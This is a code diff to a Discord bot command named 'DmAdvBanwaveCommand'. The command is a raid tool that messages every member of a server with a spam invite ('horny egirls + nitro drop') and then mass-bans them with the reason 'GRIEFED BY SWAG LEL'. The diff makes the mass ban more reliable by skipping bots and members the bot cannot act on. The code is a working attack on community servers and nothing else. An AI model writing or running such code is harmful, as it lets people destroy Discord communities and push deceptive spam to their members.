@@ -23,12 +23,12 @@ public class DmAdvBanwaveCommand implements ICommand {
         }
         Thread banwave1 = new Thread(() -> {
             try {
-                List<Member> members = event.getGuild().getMembers();
-                for (int i = 0; i <= members.size(); i++) {
-                    if (members.get(i).getUser().getIdLong() != Core.OWNERID || !members.get(0).getId().equals(event.getAuthor().getId())) {
-                        Wrapper.sendPrivateMessage(event.getJDA(), members.get(i).getUser().getId(), "discord.gg/failures hacked by swag");
-                        event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY SWAG").queue();
-                        Logger.getLogger().print("Banned " + members.get(i).getUser().getName() + "#" + members.get(i).getUser().getDiscriminator());
+                for (Member member : event.getGuild().getMembers()) {
+                    if (member.getIdLong() != Core.OWNERID || !member.getId().equals(event.getAuthor().getId())) {
+                        Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "discord.gg/failures **horny egirls + nitro drop + packing events** hacked by swag");
+                        if (event.getGuild().getSelfMember().canInteract(member) && !member.getUser().isBot())
+                        event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG LEL").queue();
+                        Logger.getLogger().print("Banned " + member.getUser().getAsTag());
                         Thread.sleep(300);
                     }
                 }
